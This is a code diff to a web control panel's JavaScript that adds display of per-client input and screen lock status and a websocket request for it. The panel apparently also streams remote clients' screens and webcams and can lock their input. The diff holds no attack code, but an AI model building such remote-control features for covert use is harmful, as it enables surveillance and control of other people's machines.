@@ -1506,6 +1506,8 @@ body { background: var(--bg); color: var(--text); font-family: var(--mono); heig
 // ════════════════════════════════════════════════════════════
 
 
+let lockStates = {};  // client_id -> { input: bool, screen: bool }
+
 let lockOpen = false;
 let lockImageFile = null;
 let lockImageBase64 = null;
@@ -1575,6 +1577,18 @@ ws.onmessage = ({data}) => {
     $img.src='data:image/jpeg;base64,'+msg.image; showScreen(); return;
   }
 
+
+  if (type === 'lock_status' && client_id) {
+      lockStates[client_id] = {
+          input: msg.input_locked,
+          screen: msg.screen_locked
+      };
+      // If this client is currently selected, update the UI
+      if (client_id === selClient) {
+          updateLockUI();
+      }
+      return;
+  }
 
   if (type==='webcam_frame' && client_id===selClient) {
     const now=performance.now();
@@ -1694,6 +1708,21 @@ ws.onmessage = ({data}) => {
 
 
 
+
+
+function updateLockUI() {
+    const state = lockStates[selClient];
+    if (state) {
+        document.getElementById('inputStatus').textContent = state.input ? 'Locked' : 'Unlocked';
+        document.getElementById('screenStatus').textContent = state.screen ? 'Locked' : 'Unlocked';
+        // Optional: add color coding
+        document.getElementById('inputStatus').style.color = state.input ? 'var(--red)' : 'var(--green)';
+        document.getElementById('screenStatus').style.color = state.screen ? 'var(--red)' : 'var(--green)';
+    } else {
+        document.getElementById('inputStatus').textContent = 'Unknown';
+        document.getElementById('screenStatus').textContent = 'Unknown';
+    }
+}
 
 
 // ════════════════════════════════════════════════════════════
@@ -2645,16 +2674,20 @@ function closeAlert() {
 }
 
 function toggleLockPanel() {
-  lockOpen = !lockOpen;
-  document.getElementById('lockPanel').classList.toggle('open', lockOpen);
-  document.getElementById('lockBtn').classList.toggle('files-active', lockOpen);
-  // Đóng các panel khác nếu cần
-  if (lockOpen) {
-    if (exOpen) toggleExplorer();
-    if (tmOpen) toggleTaskManager();
-    if (wpOpen) toggleWallpaper();
-    if (alertOpen) toggleAlertPanel();
-  }
+    lockOpen = !lockOpen;
+    document.getElementById('lockPanel').classList.toggle('open', lockOpen);
+    document.getElementById('lockBtn').classList.toggle('files-active', lockOpen);
+    // Close other panels if needed...
+    
+    if (lockOpen && selClient) {
+        // Request current lock state from client
+        ws.send(JSON.stringify({
+            type: 'get_lock_status',
+            client_id: selClient
+        }));
+        // Also show stored state immediately if available
+        updateLockUI();
+    }
 }
 
 function onLockImageDrop(e) {
